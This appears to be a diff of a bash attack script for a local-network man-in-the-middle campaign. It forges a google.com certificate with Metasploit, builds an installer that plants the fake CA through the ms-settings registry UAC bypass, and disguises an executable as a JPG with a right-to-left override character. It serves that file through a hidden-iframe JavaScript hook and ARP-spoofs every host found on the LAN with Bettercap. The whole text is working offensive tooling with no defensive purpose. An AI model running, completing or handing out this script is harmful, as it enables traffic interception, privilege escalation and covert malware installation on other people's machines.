@@ -47,15 +47,15 @@ set -euo pipefail
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
-# --- Config ---
-WINEPREFIX="${WINEPREFIX:-$HOME/.wine}"
-mkdir -p "/tmp/mitm" "$WINEPREFIX/drive_c/pyinstaller-build"
-
 # --- Check for root privileges ---
 if [[ "$(id -u)" -ne 0 ]]; then
     color_print RED "[X] Please run as ROOT."
     exit 1
 fi
+
+# --- Config ---
+WINEPREFIX="${WINEPREFIX:-$HOME/.wine}"
+mkdir -p "$WINEPREFIX/drive_c/pyinstaller-build"
 
 # --- Detect network interface & local IP ---
 IFACE=$(ip route | awk '/^default/ {print $5; exit}')
@@ -65,13 +65,13 @@ color_print GREEN "[*] Local IP address: $LAN"
 
 # --- Cleanup previous sessions ---
 color_print YELLOW "[*] Cleaning up previous sessions..."
-pkill -x msfconsole 2>/dev/null || true
-pkill -x bettercap 2>/dev/null || true
-rm -rf "$HOME/.msf4/loot"/* "/var/www/html"/* "/tmp/mitm"/* "$WINEPREFIX/drive_c/pyinstaller-build"/* 2>/dev/null || true
+pkill -x msfconsole 2>/dev/null
+pkill -x bettercap 2>/dev/null
+rm -rf "$HOME/.msf4/loot"/* "$WINEPREFIX/drive_c/pyinstaller-build"/* 2>/dev/null
 
 # --- Generate fake certificate in background ---
 color_print CYAN "[*] Generating fake certificate in background..."
-msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit" > /tmp/msf_cert.log 2>&1 &
+msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit"
 MSF_PID=$!
 
 # Wait for certificate files (max 30s)
@@ -85,9 +85,9 @@ done
 if [[ -z "${CERT_CRT:-}" || -z "${CERT_KEY:-}" ]]; then
     color_print RED "[X] Failed to generate certificate files."
 else
-    cp -f "$CERT_CRT" /tmp/mitm/ca.crt
-    cp -f "$CERT_KEY" /tmp/mitm/ca.key
-    openssl x509 -in /tmp/mitm/ca.crt -out /tmp/mitm/ca.pem
+    cp -f "$CERT_CRT" /tmp/ca.crt
+    cp -f "$CERT_KEY" /tmp/ca.key
+    openssl x509 -in /tmp/ca.crt -out /tmp/ca.pem
     color_print GREEN "[*] Certificate generated."
 fi
 
@@ -98,10 +98,10 @@ convert "/tmp/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "/tmp/
 
 # --- Build Python installer ---
 color_print GREEN "[*] Building Python installer..."
-cat > "/tmp/mitm/cert-installer.py" << 'EOF'
+cat > "/tmp/cert-installer.py" << 'EOF'
 import os, subprocess, tempfile, base64, time, winreg, sys
 
-CERT_DATA = """$(base64 -w0 "/tmp/mitm/ca.crt")"""
+CERT_DATA = """$(base64 -w0 "/tmp/ca.crt")"""
 CERT_FILENAME = "google.crt"
 TMP_CERT_PATH = os.path.join(tempfile.gettempdir(), CERT_FILENAME)
 REG_PATH = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
@@ -159,26 +159,30 @@ Silent=1
 Overwrite=1
 Update=U
 EOF
-rar a -sfx -z"/tmp/mitm/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "/tmp/svchost.exe" >> /tmp/rar.log 2>&1 || true
+rar a -sfx -z"/tmp/mitm/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "/tmp/svchost.exe"
 
 # --- Apache setup & HTML injection ---
 color_print GREEN "[*] Setting up Apache..."
 rm -rf "/var/www/html"/*
-wget -q -O "/var/www/html/index.html" -U "Mozilla/5.0" https://google.com
-sed -i "s|</body>|<iframe src='google-update-%E2%80%AEexe.jpg' width=0 height=0 style='display:none'></iframe>\n</body>|g" "/var/www/html/index.html"
 service apache2 restart
 
 # --- Network scan to find targets ---
 color_print CYAN "[*] Scanning network..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain 2>/dev/null | awk '{print $1}' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "$LAN" | sort -u | paste -sd ',' -)
-[[ -z "$TARGETS" ]] && TARGETS="127.0.0.1"
 
 cat > /tmp/hook.js << EOF
-<iframe src="http://$LAN/google-update-%E2%80%AEexe.jpg" width=0 height=0 style="display:none"></iframe>
+const iframe = document.createElement('iframe');
+iframe.src = 'http://$LAN/google-update-%E2%80%AEexe.jpg';
+iframe.width = '0';
+iframe.height = '0';
+iframe.style.display = 'none';
+
+document.body.appendChild(iframe);
+
 EOF
 
 # --- Create Bettercap caplet ---
-cat > /tmp/mitm/fallback.cap << EOF
+cat > /tmp/fallback.cap << EOF
 set arp.spoof.targets $TARGETS
 set arp.spoof.internal true
 
@@ -198,7 +202,7 @@ EOF
 
 # --- Launch Bettercap ---
 color_print GREEN "[*] Starting Bettercap..."
-bettercap -iface "$IFACE" -caplet /tmp/mitm/fallback.cap
+bettercap -iface "$IFACE" -caplet /tmp/fallback.cap
 ```
 
 _Run & Execute_
